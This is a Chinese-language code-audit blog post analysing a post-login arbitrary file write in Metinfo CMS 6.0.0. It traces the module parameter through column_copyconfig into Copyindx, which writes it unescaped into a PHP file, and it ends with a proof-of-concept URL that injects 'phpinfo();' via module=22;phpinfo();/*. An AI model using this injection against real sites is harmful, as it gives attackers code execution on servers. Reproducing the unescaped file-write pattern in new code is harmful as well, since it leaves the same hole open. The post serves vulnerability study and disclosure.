---
title: Metinfo v6.0.0 getshell in background
date: 2018-06-29 21:15:22
tags:
  - metinfo
  - php
  - 代码审计
---

# Metinfo v6.0.0 后台getshell
## 漏洞分析
漏洞发生在`metinfo6\admin\column\save.php`约32行处的`column_copyconfig`函数
```php
require_once '../login/login_check.php';
require_once 'global.func.php';
if($action=="editor"){
	if($name=='')metsave('-1',$lang_js11);
	if($if_in==1 and $out_url=='' and $module<1000)metsave('-1',$lang_modOuturl);
	if($module==1 &&$isshow==0 && !($met_class2[$id]||$met_class3[$id]))metsave('-1',$lang_columnerr8);
	$filename=namefilter($filename);
	$filenameold=namefilter($filenameold);
	$indeximg =$metadmin[categorymarkimage]?$indeximg:'';
	$columnimg=$metadmin[categoryimage]?$columnimg:'';
	if($new_windows==0){
		$new_windows=null;
	}
	if($new_windows==1){
		$new_windows="target=''_blank''";
	}
	if($if_in==0){
		if($filename!='' && $filename!=$filenameold){
			$filenameok = $db->get_one("SELECT * FROM {$met_column} WHERE filename='{$filename}' and foldername='$foldername' and id!='$id'");
			if($filenameok)metsave('-1',$lang_modFilenameok);
			if(is_numeric($filename) && $filename!=$id && $met_pseudo){
				$filenameok1 = $db->get_one("SELECT * FROM {$met_column} WHERE id='{$filename}' and foldername='$foldername'");
				if($filenameok1)metsave('-1',$lang_jsx30);
			}
		}
		$filedir="../../".$foldername;  
		if(!file_exists($filedir))@mkdir($filedir,0777); 		
		if(!file_exists($filedir))metsave('-1',$lang_modFiledir);
		column_copyconfig($foldername,$module,$id);
		if($met_member_use)require_once 'check.php';
		……
```
跟进这个函数看一下，在`metinfo6\admin\column\global.func.php`文件中
```php
<?php
# MetInfo Enterprise Content Management System 
# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. 
function column_copyconfig($foldername,$module,$id){
	global $anyid,$lang_columntip13,$lang,$db,$met_column;
	switch($module){
		case 1:
			$indexaddress ="../about/index.php";
			$newfile  =ROOTPATH.$foldername."/show.php";  
			$address  ="../about/show.php";				
			Copyfile($address,$newfile);
		break;
		case 2:
			$indexaddress ="../news/index.php";
			$newfile =ROOTPATH.$foldername."/news.php"; 
			$address ="../news/news.php"; 
			Copyfile($address,$newfile); 
			$newfile =ROOTPATH.$foldername."/shownews.php"; 
			$address  ="../news/shownews.php"; 
			Copyfile($address,$newfile);
		break;
		case 3:
			$indexaddress ="../product/index.php";
			$newfile =ROOTPATH.$foldername."/product.php";  
			$address  ="../product/product.php"; 
			Copyfile($address,$newfile); 
			$newfile =ROOTPATH.$foldername."/showproduct.php";  
			$address  ="../product/showproduct.php"; 
			Copyfile($address,$newfile);
		break;
		case 4:
			$indexaddress ="../download/index.php";
			$newfile =ROOTPATH.$foldername."/download.php";  
			$address  ="../download/download.php"; 
			Copyfile($address,$newfile); 
			$newfile =ROOTPATH.$foldername."/showdownload.php";  
			$address  ="../download/showdownload.php"; 
			Copyfile($address,$newfile);
			$newfile =ROOTPATH.$foldername."/down.php";  
			$address  ="../download/down.php"; 
			Copyfile($address,$newfile);
		break;
		case 5:
			$indexaddress ="../img/index.php";
			$newfile =ROOTPATH.$foldername."/img.php";  
			$address  ="../img/img.php"; 
			Copyfile($address,$newfile);
			$newfile =ROOTPATH.$foldername."/showimg.php";  
			$address  ="../img/showimg.php"; 
			Copyfile($address,$newfile);
		break;
		case 7:  
			$array[1][0]='met_fd_time';
			$array[1][1]='120';
			$array[2][0]='met_fd_word';
			$array[2][1]='';
			$array[3][0]='met_fd_email';
			$array[3][1]='0';
			$array[4][0]='met_fd_type';
			$array[4][1]='1';
			$array[5][0]='met_fd_to';
			$array[5][1]='';
			$array[6][0]='met_fd_back';
			$array[6][1]='0';
			$array[7][0]='met_fd_title';
			$array[7][1]='';
			$array[8][0]='met_fd_content';
			$array[8][1]='';
			$array[9][0]='met_fd_ok';
			$array[9][1]='1';
			$array[10][0]='met_fd_sms_back';
			$array[10][1]='';
			$array[11][0]='met_fd_sms_content';
			$array[11][1]='';
			$array[12][0]='met_fd_sms_dell';
			$array[12][1]='';
			$array[13][0]='met_message_fd_class';
			$array[13][1]='';
			$array[14][0]='met_message_fd_content';
			$array[14][1]='';
			$array[15][0]='met_message_fd_email';
			$array[15][1]='';
			$array[16][0]='met_message_fd_sms';
			$array[16][1]='';
			verbconfig($array,$id);
		break;
		case 8:  
			$indexaddress ="../feedback/index.php";
			$newfile =ROOTPATH.$foldername."/uploadfile_save.php";  
			$address ="../feedback/uploadfile_save.php";
			Copyfile($address,$newfile);
			$array[1][0]='met_fd_time';
			$array[1][1]='120';
			$array[2][0]='met_fd_word';
			$array[2][1]='';
			$array[3][0]='met_fd_type';
			$array[3][1]='1';
			$array[4][0]='met_fd_to';
			$array[4][1]='';
			$array[5][0]='met_fd_back';
			$array[5][1]='0';
			$array[6][0]='met_fd_email';
			$array[6][1]='1';
			$array[7][0]='met_fd_title';
			$array[7][1]='';
			$array[8][0]='met_fd_content';
			$array[8][1]='';
			$array[9][0]='met_fdtable';
			$fd_title=$db->get_one("SELECT * FROM $met_column WHERE id='$id'");
			$array[9][1]=$fd_title['name'];
			$array[10][0]='met_fd_class';
			$array[10][1]='1';
			$array[11][0]='met_fd_ok';
			$array[11][1]='1';
			$array[12][0]='met_fd_sms_back';
			$array[12][1]='';
			$array[13][0]='met_fd_sms_content';
			$array[13][1]='';
			$array[14][0]='met_fd_sms_dell';
			$array[14][1]='';
			verbconfig($array,$id);
		break;
	}
	Copyindx(ROOTPATH.$foldername.'/index.php',$module);
}
```
中间的switch部分可以跳过，可以直接来到`Copyindx`函数，这是个文件备份写入的函数  
跟进这个函数,大约在`metinfo6\admin\include\global.func.php`884行附件
```php
/*复制首页*/
function Copyindx($newindx,$type){
	if(!file_exists($newindx)){
		$oldcont ="<?php\n# MetInfo Enterprise Content Management System \n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \n\$filpy = basename(dirname(__FILE__));\n\$fmodule=$type;\nrequire_once '../include/module.php'; \nrequire_once \$module; \n# This program is an open source system, commercial use, please consciously to purchase commercial license.\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\n?>";

		$fp = fopen($newindx,w);
		fputs($fp, $oldcont);
		fclose($fp);
	}
}
```
可以看到这里将$type变量直接写入了文件中，而$type变量一直可以追溯到`column_copyconfig`的$module变量  
根据`metinfo6\admin\include\common.inc.php`中的伪全局变量覆盖，大约在77行左右
```php
foreach(array('_COOKIE', '_POST', '_GET') as $_request) {
	foreach($$_request as $_key => $_value) {
		$_key{0} != '_' && $$_key = daddslashes($_value,0,0,1);
		$_M['form'][$_key]=daddslashes($_value,0,0,1);
	}
}
```
就可以通过传入get参数，覆盖$module变量，导致任意文件写入

## POC
先进行管理员登录之后
传入如下poc
```
http://localhost/metinfo6/admin/column/save.php?
name=123
&action=editor
&foldername=upload
&module=22;phpinfo();/*
```
就会在upload目录下生成phpinfo页面。
![](/Metinfo-v6-0-0-getshell-in-background/1.png)  